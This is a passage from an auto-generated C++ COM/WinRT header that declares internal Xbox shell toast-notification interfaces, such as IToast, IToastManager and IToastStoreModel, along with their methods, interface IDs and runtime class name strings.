                        /* [propget] */virtual HRESULT STDMETHODCALLTYPE get_UserColor3(
                            /* [retval, out] */UINT32 * value
                            ) = 0;
                        /* [propget] */virtual HRESULT STDMETHODCALLTYPE get_UserGamertag(
                            /* [retval, out] */HSTRING * value
                            ) = 0;
                        /* [propget] */virtual HRESULT STDMETHODCALLTYPE get_Duration(
                            /* [retval, out] */Windows::Xbox::UI::Internal::ToastNotifications::ToastDuration * value
                            ) = 0;
                        /* [propget] */virtual HRESULT STDMETHODCALLTYPE get_SourceApplicationId(
                            /* [retval, out] */HSTRING * value
                            ) = 0;
                        /* [propget] */virtual HRESULT STDMETHODCALLTYPE get_SourceApplicationTitle(
                            /* [retval, out] */HSTRING * value
                            ) = 0;
                        /* [propget] */virtual HRESULT STDMETHODCALLTYPE get_Timestamp(
                            /* [retval, out] */UINT64 * value
                            ) = 0;
                        /* [propget] */virtual HRESULT STDMETHODCALLTYPE get_UserId(
                            /* [retval, out] */UINT32 * value
                            ) = 0;
                        /* [propget] */virtual HRESULT STDMETHODCALLTYPE get_CorrelationID(
                            /* [retval, out] */HSTRING * value
                            ) = 0;
                        /* [propget] */virtual HRESULT STDMETHODCALLTYPE get_UniqueToastId(
                            /* [retval, out] */GUID * value
                            ) = 0;
                        /* [propput] */virtual HRESULT STDMETHODCALLTYPE put_IsUnseen(
                            /* [in] */::boolean value
                            ) = 0;
                        /* [propget] */virtual HRESULT STDMETHODCALLTYPE get_IsUnseen(
                            /* [retval, out] */::boolean * value
                            ) = 0;
                        /* [propput] */virtual HRESULT STDMETHODCALLTYPE put_IsUnread(
                            /* [in] */::boolean value
                            ) = 0;
                        /* [propget] */virtual HRESULT STDMETHODCALLTYPE get_IsUnread(
                            /* [retval, out] */::boolean * value
                            ) = 0;
                        /* [propget] */virtual HRESULT STDMETHODCALLTYPE get_UserXuid(
                            /* [retval, out] */HSTRING * value
                            ) = 0;
                        /* [propget] */virtual HRESULT STDMETHODCALLTYPE get_WpnUserId(
                            /* [retval, out] */UINT32 * value
                            ) = 0;
                        /* [propget] */virtual HRESULT STDMETHODCALLTYPE get_QuickRows(
                            /* [retval, out] */__FIVectorView_1_Windows__CXbox__CUI__CInternal__CToastNotifications__CIToastQuickRow * * value
                            ) = 0;
                        /* [propget] */virtual HRESULT STDMETHODCALLTYPE get_CombinedImageNarratorString(
                            /* [retval, out] */HSTRING * value
                            ) = 0;
                        /* [propget] */virtual HRESULT STDMETHODCALLTYPE get_Scenario(
                            /* [retval, out] */HSTRING * value
                            ) = 0;
                        /* [propget] */virtual HRESULT STDMETHODCALLTYPE get_AttractModeData(
                            /* [retval, out] */HSTRING * value
                            ) = 0;
                        /* [propget] */virtual HRESULT STDMETHODCALLTYPE get_InboxCategory(
                            /* [retval, out] */HSTRING * value
                            ) = 0;
                        /* [propget] */virtual HRESULT STDMETHODCALLTYPE get_InboxType(
                            /* [retval, out] */HSTRING * value
                            ) = 0;
                        /* [propget] */virtual HRESULT STDMETHODCALLTYPE get_InboxId(
                            /* [retval, out] */HSTRING * value
                            ) = 0;
                        
                    };

                    MIDL_CONST_ID IID & IID_IToast=_uuidof(IToast);
                    
                } /* ToastNotifications */
            } /* Internal */
        } /* UI */
    } /* Xbox */
} /* Windows */

EXTERN_C const IID IID___x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIToast;
#endif /* !defined(____x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIToast_INTERFACE_DEFINED__) */
#endif // WINDOWS_XBOX_SHELL_TOASTNOTIFICATIONSCONTRACT_VERSION >= 0x10000


/*
 *
 * Interface Windows.Xbox.UI.Internal.ToastNotifications.IToastAction
 *
 * Introduced to Windows.Xbox.Shell.ToastNotificationsContract in version 1.0
 *
 *
 */
#if WINDOWS_XBOX_SHELL_TOASTNOTIFICATIONSCONTRACT_VERSION >= 0x10000
#if !defined(____x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIToastAction_INTERFACE_DEFINED__)
#define ____x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIToastAction_INTERFACE_DEFINED__
extern const __declspec(selectany) _Null_terminated_ WCHAR InterfaceName_Windows_Xbox_UI_Internal_ToastNotifications_IToastAction[] = L"Windows.Xbox.UI.Internal.ToastNotifications.IToastAction";

namespace Windows {
    namespace Xbox {
        namespace UI {
            namespace Internal {
                namespace ToastNotifications {
                    /* [object, uuid("3AA718E7-7FF5-4F41-A3AB-77C4A1A8ADB2"), contract] */
                    MIDL_INTERFACE("3AA718E7-7FF5-4F41-A3AB-77C4A1A8ADB2")
                    IToastAction : public IInspectable
                    {
                    public:
                        /* [propget] */virtual HRESULT STDMETHODCALLTYPE get_ActivationArgs(
                            /* [retval, out] */HSTRING * value
                            ) = 0;
                        /* [propget] */virtual HRESULT STDMETHODCALLTYPE get_IsSystemCommand(
                            /* [retval, out] */::boolean * value
                            ) = 0;
                        virtual HRESULT STDMETHODCALLTYPE Execute(
                            /* [in] */Windows::Xbox::Input::IController * invokingDevice,
                            /* [in] */Windows::System::IUser * invokingUser,
                            /* [in] */__FIMapView_2_HSTRING_HSTRING * inputs
                            ) = 0;
                        
                    };

                    MIDL_CONST_ID IID & IID_IToastAction=_uuidof(IToastAction);
                    
                } /* ToastNotifications */
            } /* Internal */
        } /* UI */
    } /* Xbox */
} /* Windows */

EXTERN_C const IID IID___x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIToastAction;
#endif /* !defined(____x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIToastAction_INTERFACE_DEFINED__) */
#endif // WINDOWS_XBOX_SHELL_TOASTNOTIFICATIONSCONTRACT_VERSION >= 0x10000


/*
 *
 * Interface Windows.Xbox.UI.Internal.ToastNotifications.IToastImage
 *
 * Introduced to Windows.Xbox.Shell.ToastNotificationsContract in version 1.0
 *
 *
 */
#if WINDOWS_XBOX_SHELL_TOASTNOTIFICATIONSCONTRACT_VERSION >= 0x10000
#if !defined(____x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIToastImage_INTERFACE_DEFINED__)
#define ____x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIToastImage_INTERFACE_DEFINED__
extern const __declspec(selectany) _Null_terminated_ WCHAR InterfaceName_Windows_Xbox_UI_Internal_ToastNotifications_IToastImage[] = L"Windows.Xbox.UI.Internal.ToastNotifications.IToastImage";

namespace Windows {
    namespace Xbox {
        namespace UI {
            namespace Internal {
                namespace ToastNotifications {
                    /* [object, uuid("48ED78AE-1D8F-4106-8B46-74BD3E2D2B7B"), contract] */
                    MIDL_INTERFACE("48ED78AE-1D8F-4106-8B46-74BD3E2D2B7B")
                    IToastImage : public IInspectable
                    {
                    public:
                        /* [propget] */virtual HRESULT STDMETHODCALLTYPE get_Uri(
                            /* [retval, out] */HSTRING * value
                            ) = 0;
                        /* [propget] */virtual HRESULT STDMETHODCALLTYPE get_RoundImage(
                            /* [retval, out] */::boolean * value
                            ) = 0;
                        /* [propget] */virtual HRESULT STDMETHODCALLTYPE get_RequiresFileStream(
                            /* [retval, out] */::boolean * value
                            ) = 0;
                        virtual HRESULT STDMETHODCALLTYPE GetFileStream(
                            /* [retval, out] */Windows::Storage::Streams::IRandomAccessStream * * fileStream
                            ) = 0;
                        
                    };

                    MIDL_CONST_ID IID & IID_IToastImage=_uuidof(IToastImage);
                    
                } /* ToastNotifications */
            } /* Internal */
        } /* UI */
    } /* Xbox */
} /* Windows */

EXTERN_C const IID IID___x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIToastImage;
#endif /* !defined(____x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIToastImage_INTERFACE_DEFINED__) */
#endif // WINDOWS_XBOX_SHELL_TOASTNOTIFICATIONSCONTRACT_VERSION >= 0x10000


/*
 *
 * Interface Windows.Xbox.UI.Internal.ToastNotifications.IToastInternal
 *
 * Introduced to Windows.Xbox.Shell.ToastNotificationsContract in version 1.0
 *
 *
 * Interface is a part of the implementation of type Windows.Xbox.UI.Internal.ToastNotifications.Toast
 *
 *
 */
#if WINDOWS_XBOX_SHELL_TOASTNOTIFICATIONSCONTRACT_VERSION >= 0x10000
#if !defined(____x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIToastInternal_INTERFACE_DEFINED__)
#define ____x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIToastInternal_INTERFACE_DEFINED__
extern const __declspec(selectany) _Null_terminated_ WCHAR InterfaceName_Windows_Xbox_UI_Internal_ToastNotifications_IToastInternal[] = L"Windows.Xbox.UI.Internal.ToastNotifications.IToastInternal";

namespace Windows {
    namespace Xbox {
        namespace UI {
            namespace Internal {
                namespace ToastNotifications {
                    /* [object, uuid("15268FC7-64CF-44BD-805C-FE0D6B85A083"), exclusiveto, contract] */
                    MIDL_INTERFACE("15268FC7-64CF-44BD-805C-FE0D6B85A083")
                    IToastInternal : public IInspectable
                    {
                    public:
                        /* [propget] */virtual HRESULT STDMETHODCALLTYPE get_TargetUser(
                            /* [retval, out] */Windows::System::IUser * * result
                            ) = 0;
                        virtual HRESULT STDMETHODCALLTYPE DismissNotification(void) = 0;
                        
                    };

                    MIDL_CONST_ID IID & IID_IToastInternal=_uuidof(IToastInternal);
                    
                } /* ToastNotifications */
            } /* Internal */
        } /* UI */
    } /* Xbox */
} /* Windows */

EXTERN_C const IID IID___x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIToastInternal;
#endif /* !defined(____x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIToastInternal_INTERFACE_DEFINED__) */
#endif // WINDOWS_XBOX_SHELL_TOASTNOTIFICATIONSCONTRACT_VERSION >= 0x10000


/*
 *
 * Interface Windows.Xbox.UI.Internal.ToastNotifications.IToastManager
 *
 * Introduced to Windows.Xbox.Shell.ToastNotificationsContract in version 1.0
 *
 *
 * Interface is a part of the implementation of type Windows.Xbox.UI.Internal.ToastNotifications.ToastManager
 *
 *
 */
#if WINDOWS_XBOX_SHELL_TOASTNOTIFICATIONSCONTRACT_VERSION >= 0x10000
#if !defined(____x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIToastManager_INTERFACE_DEFINED__)
#define ____x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIToastManager_INTERFACE_DEFINED__
extern const __declspec(selectany) _Null_terminated_ WCHAR InterfaceName_Windows_Xbox_UI_Internal_ToastNotifications_IToastManager[] = L"Windows.Xbox.UI.Internal.ToastNotifications.IToastManager";

namespace Windows {
    namespace Xbox {
        namespace UI {
            namespace Internal {
                namespace ToastNotifications {
                    /* [object, uuid("944FEE54-68BA-4CBE-8541-08122DBE3A4A"), exclusiveto, contract] */
                    MIDL_INTERFACE("944FEE54-68BA-4CBE-8541-08122DBE3A4A")
                    IToastManager : public IInspectable
                    {
                    public:
                        virtual HRESULT STDMETHODCALLTYPE GetToastPopupModel(
                            /* [retval, out] */Windows::Xbox::UI::Internal::ToastNotifications::IToastPopupModel * * value
                            ) = 0;
                        virtual HRESULT STDMETHODCALLTYPE GetToastStoreModel(
                            /* [retval, out] */Windows::Xbox::UI::Internal::ToastNotifications::IToastStoreModel * * value
                            ) = 0;
                        virtual HRESULT STDMETHODCALLTYPE FireSystemNotification(
                            /* [in] */HSTRING aumid,
                            /* [in] */Windows::Data::Xml::Dom::IXmlDocument * payload,
                            /* [in] */UINT32 expirationInS
                            ) = 0;
                        virtual HRESULT STDMETHODCALLTYPE FireStandardNotification(
                            /* [in] */Windows::Xbox::UI::Internal::ToastNotifications::StandardNotificationType type,
                            /* [in] */HSTRING param1,
                            /* [in] */HSTRING param2,
                            /* [in] */HSTRING param3
                            ) = 0;
                        
                    };

                    MIDL_CONST_ID IID & IID_IToastManager=_uuidof(IToastManager);
                    
                } /* ToastNotifications */
            } /* Internal */
        } /* UI */
    } /* Xbox */
} /* Windows */

EXTERN_C const IID IID___x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIToastManager;
#endif /* !defined(____x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIToastManager_INTERFACE_DEFINED__) */
#endif // WINDOWS_XBOX_SHELL_TOASTNOTIFICATIONSCONTRACT_VERSION >= 0x10000


/*
 *
 * Interface Windows.Xbox.UI.Internal.ToastNotifications.IToastManagerInternal
 *
 * Introduced to Windows.Xbox.Shell.ToastNotificationsContract in version 1.0
 *
 *
 * Interface is a part of the implementation of type Windows.Xbox.UI.Internal.ToastNotifications.ToastManager
 *
 *
 */
#if WINDOWS_XBOX_SHELL_TOASTNOTIFICATIONSCONTRACT_VERSION >= 0x10000
#if !defined(____x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIToastManagerInternal_INTERFACE_DEFINED__)
#define ____x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIToastManagerInternal_INTERFACE_DEFINED__
extern const __declspec(selectany) _Null_terminated_ WCHAR InterfaceName_Windows_Xbox_UI_Internal_ToastNotifications_IToastManagerInternal[] = L"Windows.Xbox.UI.Internal.ToastNotifications.IToastManagerInternal";

namespace Windows {
    namespace Xbox {
        namespace UI {
            namespace Internal {
                namespace ToastNotifications {
                    /* [object, uuid("154762D0-7895-45AF-BA7B-A1DAE10E07E3"), exclusiveto, contract] */
                    MIDL_INTERFACE("154762D0-7895-45AF-BA7B-A1DAE10E07E3")
                    IToastManagerInternal : public IInspectable
                    {
                    public:
                        virtual HRESULT STDMETHODCALLTYPE OnWpnUserServiceStatusChanged(
                            /* [in] */UINT32 userId,
                            /* [in] */UINT32 eventType
                            ) = 0;
                        
                    };

                    MIDL_CONST_ID IID & IID_IToastManagerInternal=_uuidof(IToastManagerInternal);
                    
                } /* ToastNotifications */
            } /* Internal */
        } /* UI */
    } /* Xbox */
} /* Windows */

EXTERN_C const IID IID___x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIToastManagerInternal;
#endif /* !defined(____x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIToastManagerInternal_INTERFACE_DEFINED__) */
#endif // WINDOWS_XBOX_SHELL_TOASTNOTIFICATIONSCONTRACT_VERSION >= 0x10000


/*
 *
 * Interface Windows.Xbox.UI.Internal.ToastNotifications.IToastPopupModel
 *
 * Introduced to Windows.Xbox.Shell.ToastNotificationsContract in version 1.0
 *
 *
 * Interface is a part of the implementation of type Windows.Xbox.UI.Internal.ToastNotifications.ToastPopupModel
 *
 *
 */
#if WINDOWS_XBOX_SHELL_TOASTNOTIFICATIONSCONTRACT_VERSION >= 0x10000
#if !defined(____x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIToastPopupModel_INTERFACE_DEFINED__)
#define ____x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIToastPopupModel_INTERFACE_DEFINED__
extern const __declspec(selectany) _Null_terminated_ WCHAR InterfaceName_Windows_Xbox_UI_Internal_ToastNotifications_IToastPopupModel[] = L"Windows.Xbox.UI.Internal.ToastNotifications.IToastPopupModel";

namespace Windows {
    namespace Xbox {
        namespace UI {
            namespace Internal {
                namespace ToastNotifications {
                    /* [object, uuid("97B2FEC8-856E-4FB4-940D-30E2E0CBC7FA"), exclusiveto, contract] */
                    MIDL_INTERFACE("97B2FEC8-856E-4FB4-940D-30E2E0CBC7FA")
                    IToastPopupModel : public IInspectable
                    {
                    public:
                        /* [eventadd] */virtual HRESULT STDMETHODCALLTYPE add_OnActiveToastChanged(
                            /* [in] */Windows::Xbox::UI::Internal::ToastNotifications::IActiveToastChangedHandler  * handler,
                            /* [retval, out] */EventRegistrationToken * cookie
                            ) = 0;
                        /* [eventremove] */virtual HRESULT STDMETHODCALLTYPE remove_OnActiveToastChanged(
                            /* [in] */EventRegistrationToken cookie
                            ) = 0;
                        /* [propget] */virtual HRESULT STDMETHODCALLTYPE get_ActiveToast(
                            /* [retval, out] */Windows::Xbox::UI::Internal::ToastNotifications::IToast * * value
                            ) = 0;
                        virtual HRESULT STDMETHODCALLTYPE ReportToastMissed(
                            /* [in] */Windows::Xbox::UI::Internal::ToastNotifications::IToast * missedToast
                            ) = 0;
                        virtual HRESULT STDMETHODCALLTYPE ReportToastDismissed(
                            /* [in] */Windows::Xbox::UI::Internal::ToastNotifications::IToast * dismissedToast
                            ) = 0;
                        virtual HRESULT STDMETHODCALLTYPE ActivateToast(
                            /* [in] */Windows::Xbox::UI::Internal::ToastNotifications::IToast * activatedToast,
                            /* [in] */Windows::Xbox::Input::IController * invokingDevice,
                            /* [in] */Windows::System::IUser * invokingUser
                            ) = 0;
                        virtual HRESULT STDMETHODCALLTYPE ReportViewAvailable(void) = 0;
                        virtual HRESULT STDMETHODCALLTYPE ReportViewUnavailable(void) = 0;
                        
                    };

                    MIDL_CONST_ID IID & IID_IToastPopupModel=_uuidof(IToastPopupModel);
                    
                } /* ToastNotifications */
            } /* Internal */
        } /* UI */
    } /* Xbox */
} /* Windows */

EXTERN_C const IID IID___x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIToastPopupModel;
#endif /* !defined(____x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIToastPopupModel_INTERFACE_DEFINED__) */
#endif // WINDOWS_XBOX_SHELL_TOASTNOTIFICATIONSCONTRACT_VERSION >= 0x10000


/*
 *
 * Interface Windows.Xbox.UI.Internal.ToastNotifications.IToastQuickRow
 *
 * Introduced to Windows.Xbox.Shell.ToastNotificationsContract in version 1.0
 *
 *
 */
#if WINDOWS_XBOX_SHELL_TOASTNOTIFICATIONSCONTRACT_VERSION >= 0x10000
#if !defined(____x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIToastQuickRow_INTERFACE_DEFINED__)
#define ____x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIToastQuickRow_INTERFACE_DEFINED__
extern const __declspec(selectany) _Null_terminated_ WCHAR InterfaceName_Windows_Xbox_UI_Internal_ToastNotifications_IToastQuickRow[] = L"Windows.Xbox.UI.Internal.ToastNotifications.IToastQuickRow";

namespace Windows {
    namespace Xbox {
        namespace UI {
            namespace Internal {
                namespace ToastNotifications {
                    /* [object, uuid("E71CBF2D-3F95-4B7A-885A-A2C7AC9C6829"), contract] */
                    MIDL_INTERFACE("E71CBF2D-3F95-4B7A-885A-A2C7AC9C6829")
                    IToastQuickRow : public IInspectable
                    {
                    public:
                        /* [propget] */virtual HRESULT STDMETHODCALLTYPE get_Type(
                            /* [retval, out] */Windows::Xbox::UI::Internal::ToastNotifications::QuickRowType * value
                            ) = 0;
                        /* [propget] */virtual HRESULT STDMETHODCALLTYPE get_Id(
                            /* [retval, out] */HSTRING * value
                            ) = 0;
                        
                    };

                    MIDL_CONST_ID IID & IID_IToastQuickRow=_uuidof(IToastQuickRow);
                    
                } /* ToastNotifications */
            } /* Internal */
        } /* UI */
    } /* Xbox */
} /* Windows */

EXTERN_C const IID IID___x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIToastQuickRow;
#endif /* !defined(____x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIToastQuickRow_INTERFACE_DEFINED__) */
#endif // WINDOWS_XBOX_SHELL_TOASTNOTIFICATIONSCONTRACT_VERSION >= 0x10000


/*
 *
 * Interface Windows.Xbox.UI.Internal.ToastNotifications.IToastStoreGroup
 *
 * Introduced to Windows.Xbox.Shell.ToastNotificationsContract in version 1.0
 *
 *
 */
#if WINDOWS_XBOX_SHELL_TOASTNOTIFICATIONSCONTRACT_VERSION >= 0x10000
#if !defined(____x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIToastStoreGroup_INTERFACE_DEFINED__)
#define ____x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIToastStoreGroup_INTERFACE_DEFINED__
extern const __declspec(selectany) _Null_terminated_ WCHAR InterfaceName_Windows_Xbox_UI_Internal_ToastNotifications_IToastStoreGroup[] = L"Windows.Xbox.UI.Internal.ToastNotifications.IToastStoreGroup";

namespace Windows {
    namespace Xbox {
        namespace UI {
            namespace Internal {
                namespace ToastNotifications {
                    /* [object, uuid("DEBCD554-F959-4AFB-A3C5-FDF623403642"), contract] */
                    MIDL_INTERFACE("DEBCD554-F959-4AFB-A3C5-FDF623403642")
                    IToastStoreGroup : public IInspectable
                    {
                    public:
                        /* [propget] */virtual HRESULT STDMETHODCALLTYPE get_Timestamp(
                            /* [retval, out] */UINT64 * value
                            ) = 0;
                        /* [propget] */virtual HRESULT STDMETHODCALLTYPE get_ApplicationId(
                            /* [retval, out] */HSTRING * value
                            ) = 0;
                        /* [propget] */virtual HRESULT STDMETHODCALLTYPE get_Toasts(
                            /* [retval, out] */__FIVector_1_Windows__CXbox__CUI__CInternal__CToastNotifications__CIToast * * value
                            ) = 0;
                        /* [propget] */virtual HRESULT STDMETHODCALLTYPE get_IsUnseen(
                            /* [retval, out] */::boolean * value
                            ) = 0;
                        
                    };

                    MIDL_CONST_ID IID & IID_IToastStoreGroup=_uuidof(IToastStoreGroup);
                    
                } /* ToastNotifications */
            } /* Internal */
        } /* UI */
    } /* Xbox */
} /* Windows */

EXTERN_C const IID IID___x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIToastStoreGroup;
#endif /* !defined(____x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIToastStoreGroup_INTERFACE_DEFINED__) */
#endif // WINDOWS_XBOX_SHELL_TOASTNOTIFICATIONSCONTRACT_VERSION >= 0x10000


/*
 *
 * Interface Windows.Xbox.UI.Internal.ToastNotifications.IToastStoreModel
 *
 * Introduced to Windows.Xbox.Shell.ToastNotificationsContract in version 1.0
 *
 *
 * Interface is a part of the implementation of type Windows.Xbox.UI.Internal.ToastNotifications.ToastStoreModel
 *
 *
 */
#if WINDOWS_XBOX_SHELL_TOASTNOTIFICATIONSCONTRACT_VERSION >= 0x10000
#if !defined(____x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIToastStoreModel_INTERFACE_DEFINED__)
#define ____x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIToastStoreModel_INTERFACE_DEFINED__
extern const __declspec(selectany) _Null_terminated_ WCHAR InterfaceName_Windows_Xbox_UI_Internal_ToastNotifications_IToastStoreModel[] = L"Windows.Xbox.UI.Internal.ToastNotifications.IToastStoreModel";

namespace Windows {
    namespace Xbox {
        namespace UI {
            namespace Internal {
                namespace ToastNotifications {
                    /* [object, uuid("FA125502-5B54-45B5-A1FC-6CA677D25431"), exclusiveto, contract] */
                    MIDL_INTERFACE("FA125502-5B54-45B5-A1FC-6CA677D25431")
                    IToastStoreModel : public IInspectable
                    {
                    public:
                        virtual HRESULT STDMETHODCALLTYPE GetToastsForUser(
                            /* [in] */Windows::System::IUser * user,
                            /* [retval, out] */__FIVectorView_1_Windows__CXbox__CUI__CInternal__CToastNotifications__CIToastStoreGroup * * value
                            ) = 0;
                        virtual HRESULT STDMETHODCALLTYPE GetUnseenToastCountForUser(
                            /* [in] */Windows::System::IUser * user,
                            /* [retval, out] */UINT32 * count
                            ) = 0;
                        virtual HRESULT STDMETHODCALLTYPE UpdateToastsMarkedAsSeen(
                            /* [in] */Windows::System::IUser * user
                            ) = 0;
                        virtual HRESULT STDMETHODCALLTYPE OnActionCenterClosed(
                            /* [in] */Windows::System::IUser * user
                            ) = 0;
                        virtual HRESULT STDMETHODCALLTYPE DismissSingleToast(
                            /* [in] */Windows::Xbox::UI::Internal::ToastNotifications::IToast * dismissedToast
                            ) = 0;
                        virtual HRESULT STDMETHODCALLTYPE DismissToastGroup(
                            /* [in] */Windows::Xbox::UI::Internal::ToastNotifications::IToastStoreGroup * dismissedGroup
                            ) = 0;
                        virtual HRESULT STDMETHODCALLTYPE DismissAllToasts(
                            /* [in] */Windows::System::IUser * user
                            ) = 0;
                        virtual HRESULT STDMETHODCALLTYPE ReportPendingMultiActionToast(void) = 0;
                        
                    };

                    MIDL_CONST_ID IID & IID_IToastStoreModel=_uuidof(IToastStoreModel);
                    
                } /* ToastNotifications */
            } /* Internal */
        } /* UI */
    } /* Xbox */
} /* Windows */

EXTERN_C const IID IID___x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIToastStoreModel;
#endif /* !defined(____x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIToastStoreModel_INTERFACE_DEFINED__) */
#endif // WINDOWS_XBOX_SHELL_TOASTNOTIFICATIONSCONTRACT_VERSION >= 0x10000


/*
 *
 * Interface Windows.Xbox.UI.Internal.ToastNotifications.IVerbQuickRow
 *
 * Introduced to Windows.Xbox.Shell.ToastNotificationsContract in version 1.0
 *
 *
 * Any object which implements this interface must also implement the following interfaces:
 *     Windows.Xbox.UI.Internal.ToastNotifications.IToastQuickRow
 *
 *
 */
#if WINDOWS_XBOX_SHELL_TOASTNOTIFICATIONSCONTRACT_VERSION >= 0x10000
#if !defined(____x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIVerbQuickRow_INTERFACE_DEFINED__)
#define ____x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIVerbQuickRow_INTERFACE_DEFINED__
extern const __declspec(selectany) _Null_terminated_ WCHAR InterfaceName_Windows_Xbox_UI_Internal_ToastNotifications_IVerbQuickRow[] = L"Windows.Xbox.UI.Internal.ToastNotifications.IVerbQuickRow";

namespace Windows {
    namespace Xbox {
        namespace UI {
            namespace Internal {
                namespace ToastNotifications {
                    /* [object, uuid("E4FA0321-93CE-4F51-B6EE-6C32EC2E2D92"), contract] */
                    MIDL_INTERFACE("E4FA0321-93CE-4F51-B6EE-6C32EC2E2D92")
                    IVerbQuickRow : public IInspectable
                    {
                    public:
                        /* [propget] */virtual HRESULT STDMETHODCALLTYPE get_Label(
                            /* [retval, out] */HSTRING * value
                            ) = 0;
                        /* [propget] */virtual HRESULT STDMETHODCALLTYPE get_TargetInput(
                            /* [retval, out] */HSTRING * value
                            ) = 0;
                        
                    };

                    MIDL_CONST_ID IID & IID_IVerbQuickRow=_uuidof(IVerbQuickRow);
                    
                } /* ToastNotifications */
            } /* Internal */
        } /* UI */
    } /* Xbox */
} /* Windows */

EXTERN_C const IID IID___x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIVerbQuickRow;
#endif /* !defined(____x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIVerbQuickRow_INTERFACE_DEFINED__) */
#endif // WINDOWS_XBOX_SHELL_TOASTNOTIFICATIONSCONTRACT_VERSION >= 0x10000


/*
 *
 * Class Windows.Xbox.UI.Internal.ToastNotifications.InboxAction
 *
 * Introduced to Windows.Xbox.Shell.ToastNotificationsContract in version 1.0
 *
 *
 * Class implements the following interfaces:
 *    Windows.Xbox.UI.Internal.ToastNotifications.IInboxAction ** Default Interface **
 *
 * Class Threading Model:  Both Single and Multi Threaded Apartment
 *
 * Class Marshaling Behavior:  Agile - Class is agile
 *
 */
#if WINDOWS_XBOX_SHELL_TOASTNOTIFICATIONSCONTRACT_VERSION >= 0x10000

#ifndef RUNTIMECLASS_Windows_Xbox_UI_Internal_ToastNotifications_InboxAction_DEFINED
#define RUNTIMECLASS_Windows_Xbox_UI_Internal_ToastNotifications_InboxAction_DEFINED
extern const __declspec(selectany) _Null_terminated_ WCHAR RuntimeClass_Windows_Xbox_UI_Internal_ToastNotifications_InboxAction[] = L"Windows.Xbox.UI.Internal.ToastNotifications.InboxAction";
#endif
#endif // WINDOWS_XBOX_SHELL_TOASTNOTIFICATIONSCONTRACT_VERSION >= 0x10000


/*
 *
 * Class Windows.Xbox.UI.Internal.ToastNotifications.InboxActor
 *
 * Introduced to Windows.Xbox.Shell.ToastNotificationsContract in version 1.0
 *
 *
 * Class implements the following interfaces:
 *    Windows.Xbox.UI.Internal.ToastNotifications.IInboxActor ** Default Interface **
 *
 * Class Threading Model:  Both Single and Multi Threaded Apartment
 *
 * Class Marshaling Behavior:  Agile - Class is agile
 *
 */
#if WINDOWS_XBOX_SHELL_TOASTNOTIFICATIONSCONTRACT_VERSION >= 0x10000

#ifndef RUNTIMECLASS_Windows_Xbox_UI_Internal_ToastNotifications_InboxActor_DEFINED
#define RUNTIMECLASS_Windows_Xbox_UI_Internal_ToastNotifications_InboxActor_DEFINED
extern const __declspec(selectany) _Null_terminated_ WCHAR RuntimeClass_Windows_Xbox_UI_Internal_ToastNotifications_InboxActor[] = L"Windows.Xbox.UI.Internal.ToastNotifications.InboxActor";
#endif
#endif // WINDOWS_XBOX_SHELL_TOASTNOTIFICATIONSCONTRACT_VERSION >= 0x10000


/*
 *
 * Class Windows.Xbox.UI.Internal.ToastNotifications.InboxGameType
 *
 * Introduced to Windows.Xbox.Shell.ToastNotificationsContract in version 1.0
 *
 *
 * Class implements the following interfaces:
 *    Windows.Xbox.UI.Internal.ToastNotifications.IInboxGameType ** Default Interface **
 *
 * Class Threading Model:  Both Single and Multi Threaded Apartment
 *
 * Class Marshaling Behavior:  Agile - Class is agile
 *
 */
#if WINDOWS_XBOX_SHELL_TOASTNOTIFICATIONSCONTRACT_VERSION >= 0x10000

#ifndef RUNTIMECLASS_Windows_Xbox_UI_Internal_ToastNotifications_InboxGameType_DEFINED
#define RUNTIMECLASS_Windows_Xbox_UI_Internal_ToastNotifications_InboxGameType_DEFINED
extern const __declspec(selectany) _Null_terminated_ WCHAR RuntimeClass_Windows_Xbox_UI_Internal_ToastNotifications_InboxGameType[] = L"Windows.Xbox.UI.Internal.ToastNotifications.InboxGameType";
#endif
#endif // WINDOWS_XBOX_SHELL_TOASTNOTIFICATIONSCONTRACT_VERSION >= 0x10000


/*
 *
 * Class Windows.Xbox.UI.Internal.ToastNotifications.InboxManager
 *
 * Introduced to Windows.Xbox.Shell.ToastNotificationsContract in version 1.0
 *
 *
 * RuntimeClass contains static methods.
 *   Static Methods exist on the Windows.Xbox.UI.Internal.ToastNotifications.IInboxManager interface starting with version 1.0 of the Windows.Xbox.Shell.ToastNotificationsContract API contract
 *
 * Class Threading Model:  Both Single and Multi Threaded Apartment
 *
 * Class Marshaling Behavior:  Agile - Class is agile
 *
 */
